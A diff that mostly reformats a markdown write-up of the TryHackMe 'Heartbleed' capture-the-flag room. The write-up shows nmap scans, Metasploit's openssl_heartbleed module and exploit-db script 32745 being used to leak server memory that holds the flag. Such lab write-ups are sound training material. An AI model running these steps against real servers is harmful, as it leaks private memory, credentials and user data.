@@ -5,12 +5,15 @@
 - [References](#references)
 
 ## Room information
-```
+
+```text
+Type: Challenge
 Difficulty: Easy
 OS: Linux
 Subscription type: Premium
 Description: SSL issues are still lurking in the wild! Can you exploit this web servers OpenSSL?
 ```
+
 Room link: [https://tryhackme.com/r/room/heartbleed](https://tryhackme.com/r/room/heartbleed)
 
 ## Solution
@@ -18,6 +21,7 @@ Room link: [https://tryhackme.com/r/room/heartbleed](https://tryhackme.com/r/roo
 ### Check for services with nmap
 
 We start by scanning the machine with `nmap`
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/HeartBleed]
 └─$ nmap -v -sV -sC 34.242.247.21 
@@ -104,7 +108,9 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 16.66 seconds
 ```
+
 We have three services running:
+
 - OpenSSH 7.4 on port 22
 - rpcbind 2-4 on port 111
 - nginx 1.15.7 on port 443
@@ -112,6 +118,7 @@ We have three services running:
 ### Verify the vulnerability with nmap
 
 We can verify the presence of the vulnerabilty with nmap's vuln scripts
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/HeartBleed]
 └─$ nmap -v -p 443 --script vuln 34.242.247.21
@@ -206,6 +213,7 @@ Nmap done: 1 IP address (1 host up) scanned in 266.11 seconds
 ### Exploit the vulnerability with metasploit
 
 We can exploit the vulnerability with [Metasploit](https://www.metasploit.com/)
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/HeartBleed]
 └─$ msfconsole                                                                                            
@@ -327,8 +335,10 @@ msf6 auxiliary(scanner/ssl/openssl_heartbleed) > run
 [*] Auxiliary module execution completed
 msf6 auxiliary(scanner/ssl/openssl_heartbleed) > 
 ```
+
 The flag can be found in the beginning of the leaked memory in the `user_message` parameter
-```
+
+```text
 <---snip--->
 [*] 34.242.247.21:443     - Printable info leaked:
 <---snip--->
@@ -339,6 +349,7 @@ Content-Type: application/x-www-form-urlencoded....user_name=hacker101&user_emai
 ### Exploit the vulnerability with a standalone exploit
 
 Alternatively, we can search for a standalone exploit in [exploit-db.com](https://www.exploit-db.com/)
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/HeartBleed]
 └─$ searchsploit heartbleed       
@@ -354,7 +365,8 @@ Shellcodes: No Results
 ```
 
 Let's try the last one
-```bash                        
+
+```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/HeartBleed]
 └─$ searchsploit -m 32745     
   Exploit: OpenSSL TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure
@@ -422,6 +434,7 @@ Received heartbeat response:
   0190: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
 <---snip--->
 ```
+
 And there we have the flag again.
 
 For additional information, please see the references below.
